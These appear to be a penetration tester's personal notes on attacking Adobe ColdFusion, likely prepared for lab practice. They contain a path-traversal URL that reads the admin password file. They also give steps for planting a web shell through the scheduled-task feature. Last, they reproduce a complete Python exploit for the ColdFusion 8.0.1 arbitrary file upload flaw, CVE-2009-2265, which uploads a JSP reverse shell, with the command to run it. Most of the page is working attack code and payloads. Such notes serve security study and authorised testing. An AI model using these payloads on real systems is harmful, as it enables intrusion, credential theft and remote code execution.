#### Resources
https://pentest.tonyng.net/attacking-adobe-coldfusion/
http://dronesec.pw/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/
https://github.com/hatRiot/clusterd/blob/master/src/platform/coldfusion/deployers/lfi_stager.py
https://www.exploit-db.com/exploits/27755
---
#### ColdFusion Password attack
```
http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```
[[Hashcat#Sha1]]
#### Admin page reverse shell
Find the local path: mappings
`Active ColdFusion Mappings.`
`Actions. Logical Path Directory Path`
`ICFIDE C:\Inetpub\WWWIGONCFIDE`
Debugging & Logging > Scheduled Tasks > Schedule New Task
```
cp /usr/share/webshells/cfm/cfexec.cfm .
```
OR
create a malicious jsp and follow similar steps! >>>
![[0._Reverse shells (WEB)#jsp]]
[[Python#Server]]
Provide Task Name.
For Frequency, set for just a few minutes in advance from current time.
**MAKE SURE TO  CHECK THE PUBLISH BOX!**
For file path, use the path found from mappings page: `C:\Inetpub\wwwroot\CFIDE\cfexec.cfm`
![[Pasted image 20220613154728.png]]
After hitting submit, can run tasks right away (Green button), then visit exploit to launch.
`http://$TARGET:/CFIDE/cfexe.cfm`
![[Pasted image 20220613154901.png]]
[[1._Reverse Shells (WIN)#Stageless Payloads]]
[[4._File Transfers]]
![[Pasted image 20220613155208.png]]
[[1._rlwrap]]
#### ColdFusion 8 FileUpload
https://forum.hackthebox.com/t/python-coldfusion-8-0-1-arbitrary-file-upload/108
FileUpload.py
```python - kali
#!/usr/bin/python
# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
# Date: 2017-10-16
# Exploit Author: Alexander Reid
# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
# Version: ColdFusion 8.0.1
# CVE: CVE-2009-2265
#
# Description:
# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
# Uploads the specified jsp file to the remote server.
#
# Usage: ./exploit.py <target ip> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
import requests, sys
try:
    ip = sys.argv[1]
    port = sys.argv[2]
    if len(sys.argv) == 5:
        path = sys.argv[3]
        with open(sys.argv[4], 'r') as payload:
            body=payload.read()
    else:
        path = ""
        with open(sys.argv[3], 'r') as payload:
            body=payload.read()
except IndexError:
    print 'Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>'
    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'
    sys.exit(-1)
basepath = "http://" + ip + ":" + port + path
print 'Sending payload...'
try:
    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)
    if req.status_code == 200:
        print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'
    else:
        print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason
except requests.Timeout:
    print 'Failed to upload payload... Request timed out'
```
![[0._Reverse shells (WEB)#jsp]]
![[1._rlwrap]]
```bash - kali
python FileUpload.py $TARGET 8500 shell.jsp
```